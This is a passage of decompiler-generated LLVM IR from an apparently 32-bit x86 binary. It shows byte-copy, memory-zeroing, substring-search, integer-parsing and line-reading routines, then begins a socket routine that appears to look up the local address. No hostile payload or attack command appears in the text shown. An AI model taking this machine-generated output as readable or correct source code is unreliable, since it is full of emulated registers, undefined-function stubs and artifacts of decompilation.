  %v2_804f601 = phi i32 [ %v2_804f601.pre, %dec_label_pc_804f5ff.loopexit ], [ %v0_804f5d1, %dec_label_pc_804f5e8 ]
  %v0_804f5ff = phi i32 [ %v0_804f5ff.pre, %dec_label_pc_804f5ff.loopexit ], [ %v1_804f5e1, %dec_label_pc_804f5e8 ]
  store i32 %v0_804f5ff, i32* %eax.global-to-local, align 4
  store i32 %v2_804f601, i32* @ebx, align 4
  ret i32 %v0_804f5ff

dec_label_pc_804f604:                             ; preds = %dec_label_pc_804f5d0
  store i32 %v4_804f5d6, i32* %ebx.global-to-local, align 4
  store i32 %arg2, i32* @ecx, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  store i32 0, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804f5f3

; uselistorder directives
  uselistorder i32 %v0_804f5ff, { 1, 0 }
  uselistorder i32 %v1_804f5f9, { 1, 0 }
  uselistorder i32 %v1_804f5f8, { 1, 0 }
  uselistorder i32 %v1_804f5e1, { 1, 0, 2, 3, 5, 4 }
  uselistorder i32 %v4_804f5d6, { 2, 0, 1, 3, 4 }
  uselistorder i32* %eax.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32 %arg2, { 5, 0, 1, 2, 3, 6, 4, 7, 8 }
  uselistorder label %dec_label_pc_804f5f3, { 0, 2, 1 }
}

define i32 @function_804f610(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_804f610:
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804f611 = load i32, i32* @ebx, align 4
  store i32 %v0_804f611, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %esi.global-to-local, align 4
  store i32 %arg2, i32* %ebx.global-to-local, align 4
  %v1_804f61e = icmp eq i32 %arg3, 0
  br i1 %v1_804f61e, label %dec_label_pc_804f62f, label %dec_label_pc_804f622

dec_label_pc_804f622:                             ; preds = %dec_label_pc_804f610
  store i32 0, i32* %edx.global-to-local, align 4
  %v3_804f62411 = inttoptr i32 %arg2 to i8*
  %v4_804f62412 = load i8, i8* %v3_804f62411, align 1
  %v6_804f62714 = inttoptr i32 %arg1 to i8*
  store i8 %v4_804f62412, i8* %v6_804f62714, align 1
  %v0_804f62a15 = load i32, i32* %edx.global-to-local, align 4
  %v1_804f62a16 = add i32 %v0_804f62a15, 1
  store i32 %v1_804f62a16, i32* %edx.global-to-local, align 4
  %v12_804f62b17 = icmp eq i32 %v1_804f62a16, %arg3
  %v1_804f62d18 = icmp eq i1 %v12_804f62b17, false
  br i1 %v1_804f62d18, label %dec_label_pc_804f624.dec_label_pc_804f624_crit_edge, label %dec_label_pc_804f62f.loopexit

dec_label_pc_804f624.dec_label_pc_804f624_crit_edge: ; preds = %dec_label_pc_804f622, %dec_label_pc_804f624.dec_label_pc_804f624_crit_edge
  %v1_804f62a20 = phi i32 [ %v1_804f62a, %dec_label_pc_804f624.dec_label_pc_804f624_crit_edge ], [ %v1_804f62a16, %dec_label_pc_804f622 ]
  %v1_804f624.pre = load i32, i32* %ebx.global-to-local, align 4
  %v4_804f627.pre = load i32, i32* %esi.global-to-local, align 4
  %v2_804f624 = add i32 %v1_804f62a20, %v1_804f624.pre
  %v3_804f624 = inttoptr i32 %v2_804f624 to i8*
  %v4_804f624 = load i8, i8* %v3_804f624, align 1
  %v5_804f627 = add i32 %v1_804f62a20, %v4_804f627.pre
  %v6_804f627 = inttoptr i32 %v5_804f627 to i8*
  store i8 %v4_804f624, i8* %v6_804f627, align 1
  %v0_804f62a = load i32, i32* %edx.global-to-local, align 4
  %v1_804f62a = add i32 %v0_804f62a, 1
  store i32 %v1_804f62a, i32* %edx.global-to-local, align 4
  %v12_804f62b = icmp eq i32 %v1_804f62a, %arg3
  %v1_804f62d = icmp eq i1 %v12_804f62b, false
  br i1 %v1_804f62d, label %dec_label_pc_804f624.dec_label_pc_804f624_crit_edge, label %dec_label_pc_804f62f.loopexit

dec_label_pc_804f62f.loopexit:                    ; preds = %dec_label_pc_804f624.dec_label_pc_804f624_crit_edge, %dec_label_pc_804f622
  %v4_804f624.lcssa = phi i8 [ %v4_804f62412, %dec_label_pc_804f622 ], [ %v4_804f624, %dec_label_pc_804f624.dec_label_pc_804f624_crit_edge ]
  %phitmp = sext i8 %v4_804f624.lcssa to i32
  %v2_804f62f.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_804f62f

dec_label_pc_804f62f:                             ; preds = %dec_label_pc_804f62f.loopexit, %dec_label_pc_804f610
  %v2_804f62f = phi i32 [ %v0_804f611, %dec_label_pc_804f610 ], [ %v2_804f62f.pre, %dec_label_pc_804f62f.loopexit ]
  %.1 = phi i32 [ 0, %dec_label_pc_804f610 ], [ %phitmp, %dec_label_pc_804f62f.loopexit ]
  store i32 %v2_804f62f, i32* @ebx, align 4
  ret i32 %.1

; uselistorder directives
  uselistorder i32 %v1_804f62a, { 1, 2, 0 }
  uselistorder i32 %v1_804f62a20, { 1, 0 }
  uselistorder i32* %edx.global-to-local, { 0, 3, 4, 1, 2 }
  uselistorder i32 %arg3, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804f624.dec_label_pc_804f624_crit_edge, { 1, 0 }
}

define i32 @function_804f640(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_804f640:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %ecx.global-to-local, align 4
  %v1_804f648 = icmp eq i32 %arg2, 0
  br i1 %v1_804f648, label %dec_label_pc_804f640.dec_label_pc_804f659_crit_edge, label %dec_label_pc_804f64c

dec_label_pc_804f640.dec_label_pc_804f659_crit_edge: ; preds = %dec_label_pc_804f640
  %v0_804f659.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_804f659

dec_label_pc_804f64c:                             ; preds = %dec_label_pc_804f640
  store i32 0, i32* %eax.global-to-local, align 4
  %v3_804f6505 = inttoptr i32 %arg1 to i8*
  store i8 0, i8* %v3_804f6505, align 1
  %v0_804f6546 = load i32, i32* %eax.global-to-local, align 4
  %v1_804f6547 = add i32 %v0_804f6546, 1
  store i32 %v1_804f6547, i32* %eax.global-to-local, align 4
  %v12_804f6558 = icmp eq i32 %v1_804f6547, %arg2
  %v1_804f6579 = icmp eq i1 %v12_804f6558, false
  br i1 %v1_804f6579, label %dec_label_pc_804f650.dec_label_pc_804f650_crit_edge, label %dec_label_pc_804f659

dec_label_pc_804f650.dec_label_pc_804f650_crit_edge: ; preds = %dec_label_pc_804f64c, %dec_label_pc_804f650.dec_label_pc_804f650_crit_edge
  %v1_804f65410 = phi i32 [ %v1_804f654, %dec_label_pc_804f650.dec_label_pc_804f650_crit_edge ], [ %v1_804f6547, %dec_label_pc_804f64c ]
  %v1_804f650.pre = load i32, i32* %ecx.global-to-local, align 4
  %v2_804f650 = add i32 %v1_804f65410, %v1_804f650.pre
  %v3_804f650 = inttoptr i32 %v2_804f650 to i8*
  store i8 0, i8* %v3_804f650, align 1
  %v0_804f654 = load i32, i32* %eax.global-to-local, align 4
  %v1_804f654 = add i32 %v0_804f654, 1
  store i32 %v1_804f654, i32* %eax.global-to-local, align 4
  %v12_804f655 = icmp eq i32 %v1_804f654, %arg2
  %v1_804f657 = icmp eq i1 %v12_804f655, false
  br i1 %v1_804f657, label %dec_label_pc_804f650.dec_label_pc_804f650_crit_edge, label %dec_label_pc_804f659

dec_label_pc_804f659:                             ; preds = %dec_label_pc_804f64c, %dec_label_pc_804f650.dec_label_pc_804f650_crit_edge, %dec_label_pc_804f640.dec_label_pc_804f659_crit_edge
  %v0_804f659 = phi i32 [ %v0_804f659.pre, %dec_label_pc_804f640.dec_label_pc_804f659_crit_edge ], [ %v1_804f6547, %dec_label_pc_804f64c ], [ %v1_804f654, %dec_label_pc_804f650.dec_label_pc_804f650_crit_edge ]
  ret i32 %v0_804f659

; uselistorder directives
  uselistorder i32 %v1_804f654, { 0, 2, 3, 1 }
  uselistorder i32* %eax.global-to-local, { 0, 3, 4, 1, 2 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804f659, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804f650.dec_label_pc_804f650_crit_edge, { 1, 0 }
}

define i32 @function_804f660() local_unnamed_addr {
dec_label_pc_804f660:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  %tmp10 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp10, i32* @ecx, align 4
  %v7_804f675 = icmp sgt i32 %tmp9, %tmp10
  br i1 %v7_804f675, label %dec_label_pc_804f677, label %dec_label_pc_804f680

dec_label_pc_804f677:                             ; preds = %dec_label_pc_804f692, %dec_label_pc_804f660, %dec_label_pc_804f680
  br label %dec_label_pc_804f67a

dec_label_pc_804f67a:                             ; preds = %dec_label_pc_804f6a5, %dec_label_pc_804f677
  %storemerge = phi i32 [ -1, %dec_label_pc_804f677 ], [ %v0_804f693, %dec_label_pc_804f6a5 ]
  ret i32 %storemerge

dec_label_pc_804f680:                             ; preds = %dec_label_pc_804f660
  %tmp17 = icmp slt i32 %tmp10, 1
  br i1 %tmp17, label %dec_label_pc_804f677, label %dec_label_pc_804f684

dec_label_pc_804f684:                             ; preds = %dec_label_pc_804f680
  %v2_804f69c = add i32 %tmp, -1
  br label %dec_label_pc_804f698

dec_label_pc_804f690:                             ; preds = %dec_label_pc_804f698
  br label %dec_label_pc_804f692

dec_label_pc_804f692:                             ; preds = %dec_label_pc_804f6a5, %dec_label_pc_804f690
  %v2_804f6a03 = phi i32 [ %v1_804f6a5, %dec_label_pc_804f6a5 ], [ 0, %dec_label_pc_804f690 ]
  %v1_804f692 = add i32 %v0_804f692, 1
  %v1_804f693 = add i32 %v0_804f693, 1
  %v12_804f694 = icmp eq i32 %tmp10, %v1_804f692
  br i1 %v12_804f694, label %dec_label_pc_804f677, label %dec_label_pc_804f698

dec_label_pc_804f698:                             ; preds = %dec_label_pc_804f692, %dec_label_pc_804f684
  %v0_804f692 = phi i32 [ %v1_804f692, %dec_label_pc_804f692 ], [ 0, %dec_label_pc_804f684 ]
  %v0_804f6a5 = phi i32 [ %v2_804f6a03, %dec_label_pc_804f692 ], [ 0, %dec_label_pc_804f684 ]
  %v0_804f693 = phi i32 [ %v1_804f693, %dec_label_pc_804f692 ], [ 1, %dec_label_pc_804f684 ]
  %v3_804f69c = add i32 %v2_804f69c, %v0_804f693
  %v4_804f69c = inttoptr i32 %v3_804f69c to i8*
  %v5_804f69c = load i8, i8* %v4_804f69c, align 1
  %v4_804f6a0 = add i32 %v0_804f6a5, %tmp8
  %v5_804f6a0 = inttoptr i32 %v4_804f6a0 to i8*
  %v6_804f6a0 = load i8, i8* %v5_804f6a0, align 1
  %v17_804f6a0 = icmp eq i8 %v5_804f69c, %v6_804f6a0
  %v1_804f6a3 = icmp eq i1 %v17_804f6a0, false
  br i1 %v1_804f6a3, label %dec_label_pc_804f690, label %dec_label_pc_804f6a5

dec_label_pc_804f6a5:                             ; preds = %dec_label_pc_804f698
  %v1_804f6a5 = add i32 %v0_804f6a5, 1
  %v12_804f6a6 = icmp eq i32 %tmp9, %v1_804f6a5
  %v1_804f6a8 = icmp eq i1 %v12_804f6a6, false
  br i1 %v1_804f6a8, label %dec_label_pc_804f692, label %dec_label_pc_804f67a

; uselistorder directives
  uselistorder i32 %v0_804f693, { 2, 0, 1 }
  uselistorder i32 %v0_804f6a5, { 1, 0 }
  uselistorder i32 %v1_804f692, { 1, 0 }
  uselistorder label %dec_label_pc_804f677, { 0, 2, 1 }
}

define i32 @function_804f6b0(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_804f6b0:
  %v4_804f6b7 = ptrtoint i8* %arg1 to i32
  %v4_804f6c0.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_804f6c0

dec_label_pc_804f6c0:                             ; preds = %dec_label_pc_804f6d4, %dec_label_pc_804f6d0, %dec_label_pc_804f6c0, %dec_label_pc_804f6b0
  %v4_804f6c0 = phi i32 [ %v4_804f6c0.pre, %dec_label_pc_804f6b0 ], [ %v6_804f6c0, %dec_label_pc_804f6c0 ], [ %v6_804f6c0, %dec_label_pc_804f6d0 ], [ %v6_804f6c0, %dec_label_pc_804f6d4 ]
  %v0_804f6c2 = phi i32 [ %v4_804f6b7, %dec_label_pc_804f6b0 ], [ %v1_804f6c2, %dec_label_pc_804f6c0 ], [ %v1_804f6c2, %dec_label_pc_804f6d0 ], [ %v1_804f6c2, %dec_label_pc_804f6d4 ]
  %v1_804f6c0 = inttoptr i32 %v0_804f6c2 to i8*
  %v2_804f6c0 = load i8, i8* %v1_804f6c0, align 1
  %v3_804f6c0 = zext i8 %v2_804f6c0 to i32
  %v5_804f6c0 = and i32 %v4_804f6c0, -256
  %v6_804f6c0 = or i32 %v3_804f6c0, %v5_804f6c0
  %v1_804f6c2 = add i32 %v0_804f6c2, 1
  %v7_804f6cc = icmp eq i8 %v2_804f6c0, 32
  br i1 %v7_804f6cc, label %dec_label_pc_804f6c0, label %dec_label_pc_804f6d0

dec_label_pc_804f6d0:                             ; preds = %dec_label_pc_804f6c0
  %v10_804f6d0 = icmp eq i8 %v2_804f6c0, 9
  br i1 %v10_804f6d0, label %dec_label_pc_804f6c0, label %dec_label_pc_804f6d4

dec_label_pc_804f6d4:                             ; preds = %dec_label_pc_804f6d0
  %v10_804f6d4 = icmp eq i8 %v2_804f6c0, 10
  br i1 %v10_804f6d4, label %dec_label_pc_804f6c0, label %dec_label_pc_804f6d8

dec_label_pc_804f6d8:                             ; preds = %dec_label_pc_804f6d4
  %tmp41 = sext i32 %arg2 to i64
  %v10_804f6d8 = icmp eq i8 %v2_804f6c0, 45
  br i1 %v10_804f6d8, label %dec_label_pc_804f78d, label %dec_label_pc_804f6e1

dec_label_pc_804f6e1:                             ; preds = %dec_label_pc_804f6d8
  %v10_804f6e1 = icmp eq i8 %v2_804f6c0, 43
  br i1 %v10_804f6e1, label %dec_label_pc_804f7bd, label %dec_label_pc_804f6ea

dec_label_pc_804f6ea:                             ; preds = %dec_label_pc_804f6e1, %dec_label_pc_804f7bd
  %v0_804f73430 = phi i32 [ %v1_804f6c2, %dec_label_pc_804f6e1 ], [ %v1_804f7c0, %dec_label_pc_804f7bd ]
  %v0_804f76016.in = phi i8 [ %v2_804f6c0, %dec_label_pc_804f6e1 ], [ %v2_804f7bd, %dec_label_pc_804f7bd ]
  %v2_804f73e9 = phi i8 [ %v2_804f6c0, %dec_label_pc_804f6e1 ], [ %v2_804f7bd, %dec_label_pc_804f7bd ]
  br label %dec_label_pc_804f6f7

dec_label_pc_804f6f7:                             ; preds = %dec_label_pc_804f78d, %dec_label_pc_804f6ea
  %v0_804f73429 = phi i32 [ %v1_804f795, %dec_label_pc_804f78d ], [ %v0_804f73430, %dec_label_pc_804f6ea ]
  %v0_804f76015.in = phi i8 [ %v2_804f78d, %dec_label_pc_804f78d ], [ %v0_804f76016.in, %dec_label_pc_804f6ea ]
  %v2_804f73e8 = phi i8 [ %v2_804f78d, %dec_label_pc_804f78d ], [ %v2_804f73e9, %dec_label_pc_804f6ea ]
  %v0_804f6f7 = phi i64 [ 2147483648, %dec_label_pc_804f78d ], [ 2147483647, %dec_label_pc_804f6ea ]
  %stack_var_-20.0 = phi i32 [ 1, %dec_label_pc_804f78d ], [ 0, %dec_label_pc_804f6ea ]
  %v12_804f6fb = udiv i64 %v0_804f6f7, %tmp41
  %v13_804f6fb = trunc i64 %v12_804f6fb to i32
  %v14_804f6fb = urem i64 %v0_804f6f7, %tmp41
  %v15_804f6fb = trunc i64 %v14_804f6fb to i32
  br label %dec_label_pc_804f73e

dec_label_pc_804f710:                             ; preds = %dec_label_pc_804f73e
  %v1_804f710 = add nsw i32 %v0_804f710, -48
  %v7_804f717 = icmp slt i32 %v1_804f710, %arg2
  br i1 %v7_804f717, label %dec_label_pc_804f719, label %dec_label_pc_804f76a

dec_label_pc_804f719:                             ; preds = %dec_label_pc_804f710, %dec_label_pc_804f760
  %v1_804f731 = phi i32 [ %v1_804f710, %dec_label_pc_804f710 ], [ %v2_804f762, %dec_label_pc_804f760 ]
  %v2_804f719 = icmp slt i32 %v0_804f719, 0
  br i1 %v2_804f719, label %dec_label_pc_804f788, label %dec_label_pc_804f71d

dec_label_pc_804f71d:                             ; preds = %dec_label_pc_804f719
  %tmp42 = icmp ugt i32 %v0_804f71d, %v13_804f6fb
  br i1 %tmp42, label %dec_label_pc_804f788, label %dec_label_pc_804f723

dec_label_pc_804f723:                             ; preds = %dec_label_pc_804f71d
  %v15_804f71d = icmp eq i32 %v0_804f71d, %v13_804f6fb
  br i1 %v15_804f71d, label %dec_label_pc_804f782, label %dec_label_pc_804f725

dec_label_pc_804f725:                             ; preds = %dec_label_pc_804f782, %dec_label_pc_804f723
  %v4_804f72e = mul i32 %v1_804f72e, %arg2
  %v2_804f731 = add i32 %v1_804f731, %v4_804f72e
  br label %dec_label_pc_804f734

dec_label_pc_804f734:                             ; preds = %dec_label_pc_804f788, %dec_label_pc_804f725
  %v1_804f72e26 = phi i32 [ %v1_804f72e, %dec_label_pc_804f788 ], [ %v2_804f731, %dec_label_pc_804f725 ]
  %v0_804f77220 = phi i32 [ %v0_804f71d, %dec_label_pc_804f788 ], [ %v2_804f731, %dec_label_pc_804f725 ]
  %v0_804f76a19 = phi i32 [ -1, %dec_label_pc_804f788 ], [ 1, %dec_label_pc_804f725 ]
  %v1_804f734 = inttoptr i32 %v0_804f734 to i8*
  %v2_804f734 = load i8, i8* %v1_804f734, align 1
  %v1_804f73a = add i32 %v0_804f734, 1
  br label %dec_label_pc_804f73e

dec_label_pc_804f73e:                             ; preds = %dec_label_pc_804f6f7, %dec_label_pc_804f734
  %v0_804f734 = phi i32 [ %v0_804f73429, %dec_label_pc_804f6f7 ], [ %v1_804f73a, %dec_label_pc_804f734 ]
  %v1_804f72e = phi i32 [ 0, %dec_label_pc_804f6f7 ], [ %v1_804f72e26, %dec_label_pc_804f734 ]
  %v0_804f71d = phi i32 [ 0, %dec_label_pc_804f6f7 ], [ %v0_804f77220, %dec_label_pc_804f734 ]
  %v0_804f719 = phi i32 [ 0, %dec_label_pc_804f6f7 ], [ %v0_804f76a19, %dec_label_pc_804f734 ]
  %v0_804f710.in = phi i8 [ %v0_804f76015.in, %dec_label_pc_804f6f7 ], [ %v2_804f734, %dec_label_pc_804f734 ]
  %v2_804f73e = phi i8 [ %v2_804f73e8, %dec_label_pc_804f6f7 ], [ %v2_804f734, %dec_label_pc_804f734 ]
  %v0_804f710 = sext i8 %v0_804f710.in to i32
  %v1_804f741 = add i8 %v2_804f73e, -48
  %tmp43 = icmp ult i8 %v1_804f741, 10
  br i1 %tmp43, label %dec_label_pc_804f710, label %dec_label_pc_804f748

dec_label_pc_804f748:                             ; preds = %dec_label_pc_804f73e
  %v1_804f748 = add i8 %v2_804f73e, -65
  store i32 55, i32* @ecx, align 4
  %tmp44 = icmp ult i8 %v1_804f748, 26
  br i1 %tmp44, label %dec_label_pc_804f760, label %dec_label_pc_804f754

dec_label_pc_804f754:                             ; preds = %dec_label_pc_804f748
  %v1_804f754 = add i8 %v2_804f73e, -97
  %tmp45 = icmp ult i8 %v1_804f754, 26
  br i1 %tmp45, label %dec_label_pc_804f75b, label %dec_label_pc_804f76a

dec_label_pc_804f75b:                             ; preds = %dec_label_pc_804f754
  store i32 87, i32* @ecx, align 4
  br label %dec_label_pc_804f760

dec_label_pc_804f760:                             ; preds = %dec_label_pc_804f748, %dec_label_pc_804f75b
  %v1_804f762 = phi i32 [ 55, %dec_label_pc_804f748 ], [ 87, %dec_label_pc_804f75b ]
  %v2_804f762 = sub nsw i32 %v0_804f710, %v1_804f762
  %v7_804f768 = icmp slt i32 %v2_804f762, %arg2
  br i1 %v7_804f768, label %dec_label_pc_804f719, label %dec_label_pc_804f76a

dec_label_pc_804f76a:                             ; preds = %dec_label_pc_804f710, %dec_label_pc_804f754, %dec_label_pc_804f760
  %v2_804f76a = icmp slt i32 %v0_804f719, 0
  br i1 %v2_804f76a, label %dec_label_pc_804f7a9, label %dec_label_pc_804f76e

dec_label_pc_804f76e:                             ; preds = %dec_label_pc_804f76a
  store i32 %stack_var_-20.0, i32* @ecx, align 4
  %v1_804f774 = icmp eq i32 %stack_var_-20.0, 0
  br i1 %v1_804f774, label %dec_label_pc_804f77a, label %dec_label_pc_804f778

dec_label_pc_804f778:                             ; preds = %dec_label_pc_804f76e
  %v1_804f778 = sub i32 0, %v0_804f71d
  br label %dec_label_pc_804f77a

dec_label_pc_804f77a:                             ; preds = %dec_label_pc_804f76e, %dec_label_pc_804f778
  %v0_804f781 = phi i32 [ %v0_804f71d, %dec_label_pc_804f76e ], [ %v1_804f778, %dec_label_pc_804f778 ]
  ret i32 %v0_804f781

dec_label_pc_804f782:                             ; preds = %dec_label_pc_804f723
  %v5_804f782 = sub i32 %v1_804f731, %v15_804f6fb
  %v11_804f782 = xor i32 %v1_804f731, %v15_804f6fb
  %v12_804f782 = xor i32 %v5_804f782, %v1_804f731
  %v13_804f782 = and i32 %v12_804f782, %v11_804f782
  %v14_804f782 = icmp slt i32 %v13_804f782, 0
  %v15_804f782 = icmp eq i32 %v5_804f782, 0
  %v16_804f782 = icmp slt i32 %v5_804f782, 0
  %v3_804f786 = icmp ne i1 %v16_804f782, %v14_804f782
  %v4_804f786 = or i1 %v15_804f782, %v3_804f786
  br i1 %v4_804f786, label %dec_label_pc_804f725, label %dec_label_pc_804f788

dec_label_pc_804f788:                             ; preds = %dec_label_pc_804f71d, %dec_label_pc_804f782, %dec_label_pc_804f719
  br label %dec_label_pc_804f734

dec_label_pc_804f78d:                             ; preds = %dec_label_pc_804f6d8
  %v1_804f78d = inttoptr i32 %v1_804f6c2 to i8*
  %v2_804f78d = load i8, i8* %v1_804f78d, align 1
  %v1_804f795 = add i32 %v0_804f6c2, 2
  br label %dec_label_pc_804f6f7

dec_label_pc_804f7a9:                             ; preds = %dec_label_pc_804f76a
  %v8_804f7a9 = icmp eq i32 %stack_var_-20.0, 0
  %v2_804f7ae = zext i1 %v8_804f7a9 to i32
  %v1_804f7b33 = or i32 %v2_804f7ae, -2147483648
  ret i32 %v1_804f7b33

dec_label_pc_804f7bd:                             ; preds = %dec_label_pc_804f6e1
  %v1_804f7bd = inttoptr i32 %v1_804f6c2 to i8*
  %v2_804f7bd = load i8, i8* %v1_804f7bd, align 1
  %v1_804f7c0 = add i32 %v0_804f6c2, 2
  br label %dec_label_pc_804f6ea

; uselistorder directives
  uselistorder i32 %v5_804f782, { 1, 2, 0 }
  uselistorder i32 %v2_804f762, { 1, 0 }
  uselistorder i8 %v2_804f734, { 1, 0 }
  uselistorder i32 %v2_804f731, { 1, 0 }
  uselistorder i32 %v1_804f731, { 0, 1, 3, 2 }
  uselistorder i32 %v13_804f6fb, { 1, 0 }
  uselistorder i32 %v1_804f6c2, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v6_804f6c0, { 2, 1, 0 }
  uselistorder i8 %v2_804f6c0, { 3, 0, 1, 2, 4, 5, 6, 7 }
  uselistorder i32 %v0_804f6c2, { 1, 0, 2, 3 }
  uselistorder i8 9, { 0, 4, 6, 5, 1, 7, 2, 3 }
  uselistorder i32 %arg2, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_804f788, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804f77a, { 1, 0 }
  uselistorder label %dec_label_pc_804f76a, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804f760, { 1, 0 }
  uselistorder label %dec_label_pc_804f73e, { 1, 0 }
  uselistorder label %dec_label_pc_804f719, { 1, 0 }
  uselistorder label %dec_label_pc_804f6ea, { 1, 0 }
}

define i32 @function_804f7d0(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_804f7d0:
  %ebp.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %v0_804f7d1 = load i32, i32* @edi, align 4
  %v0_804f7d3 = load i32, i32* @ebx, align 4
  store i32 0, i32* @ebx, align 4
  store i32 %arg1, i32* %esi.global-to-local, align 4
  store i32 %arg2, i32* %ebp.global-to-local, align 4
  store i32 %arg3, i32* @edi, align 4
  %v0_804f7e5.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_804f7e5

dec_label_pc_804f7e5:                             ; preds = %dec_label_pc_804f7fd.dec_label_pc_804f7e5_crit_edge, %dec_label_pc_804f7d0
  %v0_804f7ec = phi i32 [ %v0_804f7ec.pre, %dec_label_pc_804f7fd.dec_label_pc_804f7e5_crit_edge ], [ %arg3, %dec_label_pc_804f7d0 ]
  %v1_804f7e6 = phi i32 [ %v1_804f7f8, %dec_label_pc_804f7fd.dec_label_pc_804f7e5_crit_edge ], [ 0, %dec_label_pc_804f7d0 ]
  %v0_804f7e6 = phi i32 [ %v1_804f7fd, %dec_label_pc_804f7fd.dec_label_pc_804f7e5_crit_edge ], [ %arg1, %dec_label_pc_804f7d0 ]
  %v0_804f7e5 = phi i32 [ %v1_804f7f5, %dec_label_pc_804f7fd.dec_label_pc_804f7e5_crit_edge ], [ %v0_804f7e5.pre, %dec_label_pc_804f7d0 ]
  %v2_804f7e6 = add i32 %v0_804f7e6, %v1_804f7e6
  %v4_804f7ed = inttoptr i32 %v2_804f7e6 to i32*
  %v5_804f7ed = call i32 @function_804fcec(i32 %v0_804f7ec, i32* %v4_804f7ed, i32 1, i32 %v0_804f7e5)
  %v1_804f7f5 = add i32 %v5_804f7ed, -1
  %v8_804f7f5 = icmp eq i32 %v1_804f7f5, 0
  %v1_804f7f6 = icmp eq i1 %v8_804f7f5, false
  %v0_804f804.pre = load i32, i32* @ebx, align 4
  br i1 %v1_804f7f6, label %dec_label_pc_804f804, label %dec_label_pc_804f7f8

dec_label_pc_804f7f8:                             ; preds = %dec_label_pc_804f7e5
  %v1_804f7f8 = add i32 %v0_804f804.pre, 1
  store i32 %v1_804f7f8, i32* @ebx, align 4
  %v0_804f7f9 = load i32, i32* %ebp.global-to-local, align 4
  %v7_804f7fb = icmp sgt i32 %v0_804f7f9, %v1_804f7f8
  br i1 %v7_804f7fb, label %dec_label_pc_804f7fd, label %dec_label_pc_804f804

dec_label_pc_804f7fd:                             ; preds = %dec_label_pc_804f7f8
  %v1_804f7fd = load i32, i32* %esi.global-to-local, align 4
  %v3_804f7fd = add i32 %v1_804f7fd, %v0_804f804.pre
  %v4_804f7fd = inttoptr i32 %v3_804f7fd to i8*
  %v5_804f7fd = load i8, i8* %v4_804f7fd, align 1
  %v14_804f7fd = icmp eq i8 %v5_804f7fd, 10
  %v1_804f802 = icmp eq i1 %v14_804f7fd, false
  br i1 %v1_804f802, label %dec_label_pc_804f7fd.dec_label_pc_804f7e5_crit_edge, label %dec_label_pc_804f804

dec_label_pc_804f7fd.dec_label_pc_804f7e5_crit_edge: ; preds = %dec_label_pc_804f7fd
  %v0_804f7ec.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_804f7e5

dec_label_pc_804f804:                             ; preds = %dec_label_pc_804f7e5, %dec_label_pc_804f7f8, %dec_label_pc_804f7fd
  %v0_804f804 = phi i32 [ %v1_804f7f8, %dec_label_pc_804f7f8 ], [ %v1_804f7f8, %dec_label_pc_804f7fd ], [ %v0_804f804.pre, %dec_label_pc_804f7e5 ]
  %v1_804f804 = icmp eq i32 %v0_804f804, 0
  %v1_804f806 = icmp eq i1 %v1_804f804, false
  %v0_804f813 = load i32, i32* %esi.global-to-local, align 4
  %v2_804f813 = select i1 %v1_804f806, i32 %v0_804f813, i32 0
  store i32 %v0_804f7d3, i32* @ebx, align 4
  store i32 %v0_804f7d1, i32* @edi, align 4
  ret i32 %v2_804f813

; uselistorder directives
  uselistorder i32 %v1_804f7f8, { 0, 1, 3, 4, 2 }
  uselistorder i32 %v0_804f804.pre, { 1, 0, 2 }
  uselistorder i32 %v1_804f7f5, { 1, 0 }
  uselistorder i32 (i32, i32*, i32, i32)* @function_804fcec, { 1, 0 }
  uselistorder label %dec_label_pc_804f804, { 2, 1, 0 }
}

define i32 @function_804f820() local_unnamed_addr {
dec_label_pc_804f820:
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  store i32 16, i32* %stack_var_-12, align 4
  %v1_804f82d = call i32 @function_8050089(i32 16)
  %v1_804f832 = inttoptr i32 %v1_804f82d to i32*
  store i32 0, i32* %v1_804f832, align 4
  %v3_804f83f = call i32 @function_8050345(i32 2, i32 2, i32 0)
  store i32 %v3_804f83f, i32* %esi.global-to-local, align 4
  %v10_804f84b = icmp eq i32 %v3_804f83f, -1
  br i1 %v10_804f84b, label %dec_label_pc_804f892, label %dec_label_pc_804f850

dec_label_pc_804f850:                             ; preds = %dec_label_pc_804f820
  %v2_804f850 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804f850, i32* @ebx, align 4
  store i32 2, i32* %stack_var_-28, align 4
  %v4_804f86f = call i32 @function_805016a(i32 %v3_804f83f, i32 %v2_804f850, i32 16, i32 0)
  %v2_804f877 = ptrtoint i32* %stack_var_-12 to i32
  %v0_804f87d = load i32, i32* %esi.global-to-local, align 4
  %v3_804f87e = call i32 @function_8050195(i32 %v0_804f87d, i32 %v2_804f850, i32 %v2_804f877)
  %v1_804f886 = call i32 @function_804fb51(i32 %v0_804f87d)
  br label %dec_label_pc_804f892

dec_label_pc_804f892:                             ; preds = %dec_label_pc_804f820, %dec_label_pc_804f850
